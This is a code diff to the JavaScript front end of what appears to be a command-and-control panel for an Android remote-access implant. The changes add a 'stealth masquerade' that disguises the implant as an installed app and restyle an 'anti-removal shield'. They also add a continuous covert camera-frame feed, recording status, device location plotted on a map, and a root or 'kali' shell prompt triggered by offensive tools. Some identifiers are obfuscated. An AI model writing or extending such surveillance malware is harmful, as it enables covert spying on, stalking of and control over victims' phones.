@@ -31,11 +31,20 @@ let _ac = false;
 let audioStream = null;
 let _ih = null;
 
-// Session Stability: window.fetch wrapper for handling 401/Login redirects by auto-refreshing
+// Session Stability & Render Proxy Fetch Wrapper
 const originalFetch = window.fetch;
-window.fetch = async function(...args) {
+window.fetch = async function(resource, init) {
+  let url = resource;
+  if (typeof url === 'string' && url.startsWith('/') && !url.startsWith('/proxy') && !url.startsWith('/c2/')) {
+    const urlParams = new URLSearchParams(window.location.search);
+    const deviceId = urlParams.get('deviceId');
+    if (deviceId) {
+      const sep = url.includes('?') ? '&' : '?';
+      url = `/proxy${url}${sep}deviceId=${deviceId}`;
+    }
+  }
   try {
-    const response = await originalFetch(...args);
+    const response = await originalFetch(url, init);
     if (response.status === 401) {
       showToast("SESSION_EXPIRED: Re-authenticating...", "error");
       setTimeout(() => {
@@ -48,6 +57,25 @@ window.fetch = async function(...args) {
   }
 };
 
+// Render Proxy Link Interceptor
+if (window.location.pathname.startsWith('/proxy')) {
+  const urlParams = new URLSearchParams(window.location.search);
+  const deviceId = urlParams.get('deviceId');
+  if (deviceId) {
+    document.addEventListener('click', function(e) {
+      const anchor = e.target.closest('a');
+      if (anchor && anchor.getAttribute('href') && anchor.getAttribute('href').startsWith('/')) {
+        const href = anchor.getAttribute('href');
+        if (!href.startsWith('/proxy') && !href.startsWith('/c2/')) {
+          e.preventDefault();
+          const sep = href.includes('?') ? '&' : '?';
+          window.location.href = `/proxy${href}${sep}deviceId=${deviceId}`;
+        }
+      }
+    });
+  }
+}
+
 // UI Info Popup
 function showInfo(e, t, o) {
   if (e) e.stopPropagation();
@@ -56,36 +84,63 @@ function showInfo(e, t, o) {
     n = document.createElement("div");
     n.id = "info-popup";
     Object.assign(n.style, {
-      position: "absolute",
-      background: "rgba(15,15,25,0.98)",
+      position: "fixed",
+      background: "rgba(8, 12, 18, 0.98)",
       border: "1px solid var(--neon-cyan)",
       color: "#fff",
       padding: "16px",
       borderRadius: "12px",
       zIndex: "20000",
-      width: "280px",
-      boxShadow: "0 20px 60px rgba(0,0,0,0.9), 0 0 20px rgba(0,242,255,0.1)",
-      transition: "opacity 0.3s ease",
+      width: "300px",
+      boxShadow: "0 20px 60px rgba(0,0,0,0.95), 0 0 25px rgba(0,242,255,0.2)",
+      transition: "opacity 0.25s ease",
       opacity: "0",
       display: "none",
       pointerEvents: "auto"
     });
     document.body.appendChild(n);
   }
-  const rect = e.target.getBoundingClientRect();
-  const scrollLeft = window.pageXOffset || document.documentElement.scrollLeft;
-  const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
-  let topPos = rect.bottom + scrollTop + 10;
-  let leftPos = rect.left + scrollLeft - 140 + rect.width / 2;
+
+  const triggerBtn = e ? (e.currentTarget || e.target) : null;
+  let titleColor = "var(--neon-cyan)";
+  if (triggerBtn) {
+    const parentLabel = triggerBtn.closest(".info-label");
+    if (parentLabel && parentLabel.style.color) {
+      titleColor = parentLabel.style.color;
+    } else {
+      const parentCard = triggerBtn.closest("h2, .card, .info-item, .info-section");
+      if (parentCard) {
+        const h2El = parentCard.tagName.toLowerCase() === "h2" ? parentCard : parentCard.querySelector("h2, .info-label");
+        if (h2El && h2El.style.color) {
+          titleColor = h2El.style.color;
+        } else if (h2El) {
+          const computedColor = window.getComputedStyle(h2El).color;
+          if (computedColor && computedColor !== "rgba(0, 0, 0, 0)") {
+            titleColor = computedColor;
+          }
+        }
+      }
+    }
+  }
+
+  const rect = triggerBtn ? triggerBtn.getBoundingClientRect() : { top: 100, left: 100, bottom: 120, width: 20 };
+  let topPos = rect.bottom + 8;
+  let leftPos = rect.left + (rect.width / 2) - 150;
+
+  if (topPos + 160 > window.innerHeight) {
+    topPos = rect.top - 150;
+  }
+  if (topPos < 10) topPos = 10;
 
   if (leftPos < 10) leftPos = 10;
-  if (leftPos + 280 > window.innerWidth + scrollLeft) {
-    leftPos = window.innerWidth + scrollLeft - 290;
+  if (leftPos + 300 > window.innerWidth - 10) {
+    leftPos = window.innerWidth - 310;
   }
 
   n.style.top = topPos + "px";
   n.style.left = leftPos + "px";
-  n.innerHTML = `<div style="font-weight:bold; color:var(--neon-cyan); font-family:Orbitron, sans-serif; font-size:0.8rem; margin-bottom:8px;">${t}</div><div style="font-size:0.7rem; opacity:0.8; font-family:monospace; line-height:1.4;">${o}</div>`;
+  n.style.borderColor = titleColor;
+  n.innerHTML = `<div style="font-weight:bold; color:${titleColor}; font-family:Orbitron, sans-serif; font-size:0.8rem; margin-bottom:8px; text-shadow:0 0 10px ${titleColor};">${t}</div><div style="font-size:0.72rem; opacity:0.9; font-family:'JetBrains Mono', monospace; line-height:1.5;">${o}</div>`;
   n.style.display = "block";
   setTimeout(() => n.style.opacity = "1", 10);
 }
@@ -99,25 +154,26 @@ function hideInfo() {
 }
 
 function updateNav() {
-  const n = window.location.pathname;
+  const rawPath = window.location.pathname;
+  let n = rawPath.replace(/^\/proxy/, "") || "/";
+  if (!n.startsWith("/")) n = "/" + n;
+
   const e = document.querySelectorAll(".nav a");
   e.forEach(item => {
     const t = item.getAttribute("href");
     let o = false;
-    if ("/" === t) {
+    if ("/" === t || "/terminal" === t) {
       o = ("/" === n || "/terminal" === n);
     } else if ("/files" === t) {
       o = (n.startsWith("/files") || n.startsWith("/device/apps"));
     } else if ("/device" === t) {
       o = (n.startsWith("/device") && !n.includes("/apps"));
     } else {
-      o = n.startsWith(t);
+      o = (t && t !== "/" && n.startsWith(t));
     }
 
     if (o) {
       item.classList.add("active");
-    } else if (n.startsWith(t) && "/" !== t) {
-      // no-op
     } else {
       item.classList.remove("active");
     }
@@ -162,8 +218,8 @@ function showToast(e, t = "info") {
   setTimeout(() => {
     o.style.opacity = "0";
     o.style.bottom = "15%";
-    setTimeout(() => o.style.display = "none", 500);
-  }, 5500);
+    setTimeout(() => o.style.display = "none", 300);
+  }, 3800);
 }
 
 // Repair & Optimization Functions
@@ -178,6 +234,22 @@ function repairProtocol() {
         showToast("Connection failure", "error");
       });
   });
+}
+
+function deployStealthMasquerade() {
+  const sel = document.getElementById("stealth-app-select");
+  if (!sel || !sel.value) {
+    showToast("SELECT_AN_INSTALLED_APP", "error");
+    return;
+  }
+  const pkg = sel.value;
+  showToast("DEPLOYING_STEALTH_CAMOUFLAGE...");
+  fetch("/device/masquerade?pkg=" + encodeURIComponent(pkg))
+    .then(r => {
+      showToast("STEALTH_CAMOUFLAGE_DEPLOYED");
+      setTimeout(() => location.reload(), 1500);
+    })
+    .catch(err => showToast("CAMOUFLAGE_ERROR", "error"));
 }
 
 function dispatchPermissionSequence() {
@@ -276,7 +348,7 @@ function _0x4a(e, t, o) {
     if (aborted) {
       clearInterval(progressInterval);
     } else {
-      progressVal += 4 * Math.random();
+      progressVal += 6.5 * Math.random();
       if (progressVal >= 100) {
         progressVal = 100;
         clearInterval(progressInterval);
@@ -285,11 +357,11 @@ function _0x4a(e, t, o) {
             abortSequence();
             o();
           }
-        }, 600);
+        }, 400);
       }
       document.getElementById("tm-progress").style.width = progressVal + "%";
     }
-  }, 120);
+  }, 80);
 }
 
 // Authentication & Password Settings
@@ -301,7 +373,8 @@ async function handleLogin(e) {
   n.disabled = true;
   n.style.opacity = "0.5";
   try {
-    const res = await fetch("/login", {
+    let loginEndpoint = "./login";
+    const res = await fetch(loginEndpoint, {
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
       body: "password=" + encodeURIComponent(mask(t)) + "&json=true"
@@ -312,8 +385,8 @@ async function handleLogin(e) {
       o.style.color = "#39ff14";
       o.style.textShadow = "0 0 25px #39ff14";
       setTimeout(() => {
-        window.location.href = "/?auth=" + Date.now();
-      }, 1000);
+        window.location.reload();
+      }, 800);
     } else {
       o.textContent = "INCORRECT_PASSWORD";
       o.style.color = "#ff3131";
@@ -335,12 +408,18 @@ async function handleLogin(e) {
 
 async function updatePassword(e) {
   e.preventDefault();
-  const t = e.target.querySelector('input[name="new_password"]').value;
+  const inputEl = e.target.querySelector('input[name="new_password"]');
+  if (!inputEl) return;
+  const t = inputEl.value;
+  if (!t || !t.trim()) {
+    showToast("Password cannot be empty", "error");
+    return;
+  }
   try {
     const res = await fetch("/settings/password", {
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
-      body: "new_password=" + encodeURIComponent(mask(t))
+      body: "new_password=" + encodeURIComponent(mask(t.trim()))
     });
     const text = await res.text();
     document.open();
@@ -538,8 +617,17 @@ function executeShell() {
           if (tu) tu.style.display = "none";
         }
 
+        if (t.trim().toLowerCase() === "exit") {
+          window.isKaliMode = false;
+        } else if (t.startsWith("nh") || t.startsWith("nethunter") || t.startsWith("kali") || t.startsWith("nmap") || t.startsWith("msfconsole") || t.startsWith("sqlmap") || t.startsWith("hydra") || t.startsWith("wifite") || t.startsWith("aircrack-ng")) {
+          window.isKaliMode = true;
+        }
+        const userPrefix = window.isKaliMode ? "kali@android" : "root@Android";
         const p = document.getElementById("terminal-prompt");
-        if (p) p.innerText = "root@Android:" + currentPath + symbol;
+        if (p) {
+          p.style.color = window.isKaliMode ? "var(--neon-cyan)" : "var(--terminal-green)";
+          p.innerText = userPrefix + ":" + currentPath + symbol;
+        }
 
         if (data.output === "__CLEAR_SCREEN__") {
           if (o) o.innerHTML = "";
@@ -919,12 +1007,14 @@ async function checkGhostStatus() {
       if (antiRemovalBtn) {
         if (data.antiRemoval) {
           antiRemovalBtn.innerHTML = "ANTI-REMOVAL SHIELD: ON";
-          antiRemovalBtn.style.borderColor = "var(--neon-green)";
-          antiRemovalBtn.style.color = "var(--neon-green)";
+          antiRemovalBtn.style.borderColor = "var(--neon-yellow)";
+          antiRemovalBtn.style.color = "var(--neon-yellow)";
+          antiRemovalBtn.style.background = "rgba(255, 255, 0, 0.15)";
         } else {
           antiRemovalBtn.innerHTML = "ANTI-REMOVAL SHIELD: OFF";
-          antiRemovalBtn.style.borderColor = "var(--danger)";
-          antiRemovalBtn.style.color = "var(--danger)";
+          antiRemovalBtn.style.borderColor = "var(--neon-yellow)";
+          antiRemovalBtn.style.color = "var(--neon-yellow)";
+          antiRemovalBtn.style.background = "rgba(255, 255, 0, 0.03)";
         }
       }
     }
@@ -984,20 +1074,49 @@ async function initiateStream(camId) {
 
   const mainStream = document.getElementById("main-stream");
   if (mainStream) {
-    mainStream.style.display = "none";
-    await fetch("/camera/stop-stream");
-    setTimeout(() => {
-      mainStream.src = "/camera/stream?cam=" + camId + "&width=" + _0x3d + "&height=" + _0x3e + "&quality=" + _0x3f + "&t=" + Date.now();
-      mainStream.onload = () => {
-        if (loading) loading.style.display = "none";
-        mainStream.style.display = "block";
-      };
-    }, 500);
+    await fetch("/camera/stop-stream").catch(() => {});
+    window.cameraStreamActive = true;
+    _0x3a = true;
+
+    const liveIndicator = document.getElementById("live-indicator");
+    const dot = document.getElementById("indicator-dot");
+    const text = document.getElementById("indicator-text");
+    if (liveIndicator) {
+      liveIndicator.style.borderColor = "var(--neon-green)";
+      liveIndicator.style.color = "var(--neon-green)";
+      liveIndicator.style.background = "rgba(57, 255, 20, 0.15)";
+    }
+    if (dot) dot.className = "badge-dot blink-slow";
+    if (text) text.innerText = "LIVE";
+
+    await fetch("/camera/start-stream?cam=" + camId + "&width=" + _0x3d + "&height=" + _0x3e + "&quality=" + _0x3f);
+
+    function refreshCameraFeed() {
+      if (window.cameraStreamActive) {
+        const offscreenImg = new Image();
+        offscreenImg.src = "/camera/frame?t=" + Date.now();
+        offscreenImg.onload = () => {
+          if (window.cameraStreamActive && mainStream) {
+            mainStream.src = offscreenImg.src;
+            mainStream.style.display = "block";
+            if (loading) loading.style.display = "none";
+            setTimeout(refreshCameraFeed, 20); // Silky smooth 20ms frame loop (15-25 FPS)
+          }
+        };
+        offscreenImg.onerror = () => {
+          if (window.cameraStreamActive) setTimeout(refreshCameraFeed, 150);
+        };
+      }
+    }
+
+    refreshCameraFeed();
   }
 }
 
 function terminateCaptures() {
   _0x3a = false;
+  window.cameraStreamActive = false;
+  fetch("/camera/stop-stream").catch(() => {});
   const mainStream = document.getElementById("main-stream");
   if (mainStream) {
     mainStream.src = "";
@@ -1089,7 +1208,7 @@ function checkRecStatus() {
         if (text) text.innerText = "REC (" + data.duration + "s)";
         if (recBtn) recBtn.innerText = "STOP_RECORDING";
       } else {
-        if (_0x3a) {
+        if (_0x3a || window.cameraStreamActive) {
           if (liveIndicator) {
             liveIndicator.style.borderColor = "var(--neon-green)";
             liveIndicator.style.color = "var(--neon-green)";
@@ -1149,7 +1268,7 @@ function locateDevice() {
         const extMapBtn = document.getElementById("ext-map-btn");
 
         if (mapFrame) {
-          mapFrame.src = "https://www.openstreetmap.org/export/embed.html?bbox=" + (data.lon - 0.01) + "," + (data.lat - 0.01) + "," + (data.lon + 0.01) + "," + (data.lat + 0.01) + "&layer=mapnik&marker=" + data.lat + "," + data.lon;
+          mapFrame.srcdoc = `<!DOCTYPE html><html><head><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script><style>html,body,#map{height:100%;margin:0;padding:0;background:#000;}.leaflet-tile-pane{filter:invert(90%) hue-rotate(180deg);}.red-pin{background-color:#ff0033;width:16px;height:16px;border-radius:50%;border:2px solid #ffffff;box-shadow:0 0 12px #ff0033, 0 0 24px #ff0033;animation:pulse 1.5s infinite;margin-left:-8px;margin-top:-8px;}@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(255,0,51,0.8);}70%{box-shadow:0 0 0 15px rgba(255,0,51,0);}100%{box-shadow:0 0 0 0 rgba(255,0,51,0);}}</style></head><body><div id="map"></div><script>var m=L.map('map',{zoomControl:false}).setView([${data.lat},${data.lon}],15);L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(m);var redIcon=L.divIcon({className:'custom-red-pin',html:'<div class="red-pin"></div>'});L.marker([${data.lat},${data.lon}],{icon:redIcon}).addTo(m);</script></body></html>`;
           mapFrame.style.display = "block";
         }
         if (mapOverlay) mapOverlay.style.display = "none";
